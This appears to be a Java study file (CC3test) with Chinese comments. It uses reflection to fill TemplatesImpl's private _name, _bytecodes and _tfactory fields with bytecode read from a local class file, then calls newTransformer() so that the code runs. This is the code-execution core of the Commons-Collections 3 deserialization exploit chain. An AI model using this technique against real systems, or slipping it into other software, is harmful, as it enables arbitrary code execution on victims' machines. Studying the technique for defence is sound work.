package com.study;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.File;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class CC3test {

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        // 反射修改templates的值
        Class tc = templates.getClass();
        // 修改_name
        Field NameFIeld = tc.getDeclaredField("_name");
        NameFIeld.setAccessible(true);
        NameFIeld.set(templates, "test"); // 赋值
        // 修改_bytecodes
        Field BytecodesField = tc.getDeclaredField("_bytecodes");
        BytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D://temp/classes/Test.class"));
        byte[][] codes = {code};
        BytecodesField.set(templates,codes);

        // 修改tfactory
        Field tFactoryField = tc.getDeclaredField("_tfactory");
        tFactoryField.setAccessible(true);
        tFactoryField.set(templates, new TransformerFactoryImpl());


        templates.newTransformer();
    }


}
